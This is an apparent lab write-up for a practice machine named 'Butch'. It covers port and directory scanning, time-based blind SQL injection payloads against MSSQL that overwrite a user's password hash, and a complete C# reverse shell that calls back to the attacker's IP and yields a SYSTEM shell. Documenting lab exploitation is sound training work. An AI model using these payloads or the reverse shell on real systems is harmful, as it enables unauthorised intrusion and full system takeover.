# Butch

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.208.63                      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 12:13 +08
Nmap scan report for 192.168.208.63
Host is up (0.18s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
450/tcp  open  tserver
5985/tcp open  wsman
```

WinRM is open, which can be used for `evil-winrm`. FTP does not accept anonymous logins, and SMB requires credentials to view.

### Web Enumeration --> Blind SQL Injection

Port 450 shows us a basic login:

<figure><img src="../../../.gitbook/assets/image (1418).png" alt=""><figcaption></figcaption></figure>

Default credentials don't work. Attempting any form of SQL Injection shows this:

<figure><img src="../../../.gitbook/assets/image (1375).png" alt=""><figcaption></figcaption></figure>

So this is definitely vulnerable to SQL Injection. I was unable to bypass this login, so I used `sqlmap` to verify the type of injection we needed to use.&#x20;

<figure><img src="../../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1378).png" alt=""><figcaption></figcaption></figure>

All of the payloads `sqlmap` used had the `WAITFOR DELAY` commands, which means we have to exploit time-based Blind SQLI. While I could dump out the entire database (which could take hours), I wanted to exploit it manually (as per OSCP rules, no `sqlmap`!).

So first, we can use this to verify that we have SQL Injection:

```sql
'IF (1=1) WAITFOR DELAY '0:0:10'--
```

Afterwards, I enumerated some possible usernames, and found that `butch` was one of them.&#x20;

```sql
'if (select user) = 'butch' waitfor delay '0:0:10'--
```

Let's now identify the tables that are present within this database.

{% code overflow="wrap" %}
```sql
'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--
```
{% endcode %}

The above payload verifies that `users` is a table within the database. Now we can check for columns.&#x20;

{% code overflow="wrap" %}
```sql
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name='users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--
```
{% endcode %}

However, there is no `passwords` column present. In all the boxes I've done, the passwords in the databases I found were always hashed. I googled and read a bit more about the typical naming conventions and authentication mechanisms of MSSQL servers, and found this:

{% embed url="https://learn.microsoft.com/en-us/sql/t-sql/functions/pwdcompare-transact-sql?view=sql-server-ver16" %}

This told me that the column name might be `password_hash`, and we can vertify this using this payload:

{% code overflow="wrap" %}
```sql
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name='users' and c.name = 'password_hash')=1) WAITFOR DELAY '0:0:10';--
```
{% endcode %}

Now that we have verified the existence of a `users` and `password_hash` column with a username of `butch`, we can actually update this column to have any hash we want. Right now, the hash type is unknown, so let's just try a few common hash algorithms like SHA1 and MD5.

{% code overflow="wrap" %}
```
$ echo hello | md5sum                                                             
b1946ac92492d2347c6235b4d2611184
$ echo hello | sha1sum
f572d396fae9206628714fb2ce00f72e94f2258f
$ echo hello | sha256sum
5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03
$ echo hello | sha512sum 
e7c22b994c59d9cf2b48e549b1e24666636045930d3da7c1acb299d1c3b7f931f94aae41edda2c2b207a36e10f8bcb8d45223e54878f5b316e7ce3b6bc019629
```
{% endcode %}

I tested all of these using this payload, and then attempted to login with `butch:hello`.&#x20;

{% code overflow="wrap" %}
```sql
'; UPDATE users SET password_hash = 'HASH' WHERE username='butch';--
```
{% endcode %}

We can then login to view the dashboard:

<figure><img src="../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

### Gobuster --> C# RCE

I ran a `gobuster` scan on the web appliation and found a `/dev` directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.208.63:450/ -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.208.63:450/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/21 12:40:03 Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 153] [--> http://192.168.208.63:450/dev/]
```

<figure><img src="../../../.gitbook/assets/image (1377).png" alt=""><figcaption></figcaption></figure>

The contents of the `site.master.txt` file was in C#:

```csharp
<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
	<head runat="server">
		<title>Butch</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="application-name" content="Butch">
		<meta name="author" content="Butch">
		<meta name="description" content="Butch">
		<meta name="keywords" content="Butch">
		<link media="all" href="style.css" rel="stylesheet" type="text/css" />
		<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
	</head>
	<body>
		<div id="wrap">
			<div id="header">Welcome to Butch Repository</div>
			<div id="main">
				<div id="content">
					<br />
					<asp:contentplaceholder id="ContentPlaceHolder1" runat="server"></asp:contentplaceholder>
					<br />
				</div>
			</div>
		</div>
	</body>
</html>
```

Seems that the website is written in C#, and the file that we upload replaces the . We need to note that this inherits `MyNamespacemaster.MyClassMaster`, so our code probably needs to include that. I tested by uploading some random C# files, and it caused the site to no longer work.

This means that this file upload might be overwriting the `site.master.cs` file within the machine, and we need to upload a reverse shell in C#. I used this C# reverse shell script:

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace MyNamespaceMaster
{
        public partial class MyClassMaster : MasterPage
        {
                static StreamWriter streamWriter;

                protected void Page_Load(object sender, EventArgs e)
                {
                        using(TcpClient client = new TcpClient("192.168.45.153", 445))
                        {
                                using(Stream stream = client.GetStream())
                                {
                                        using(StreamReader rdr = new StreamReader(stream))
                                        {
                                                streamWriter = new StreamWriter(stream);

                                                StringBuilder strInput = new StringBuilder();

                                                Process p = new Process();
                                                p.StartInfo.FileName = "cmd.exe";
                                                p.StartInfo.CreateNoWindow = true;
                                                p.StartInfo.UseShellExecute = false;
                                                p.StartInfo.RedirectStandardOutput = true;
                                                p.StartInfo.RedirectStandardInput = true;
                                                p.StartInfo.RedirectStandardError = true;
                                                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                                p.Start();
                                                p.BeginOutputReadLine();

                                                while(true)
                                                {
                                                        strInput.Append(rdr.ReadLine());
                                                        //strInput.Append("\n");
                                                        p.StandardInput.WriteLine(strInput);
                                                        strInput.Remove(0, strInput.Length);
                                                }
                                        }
                                }
                        }
                }

                private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        }
}
```

When we upload the file and refresh the page, we get a shell as the SYSTEM user.

<figure><img src="../../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>

Rooted!
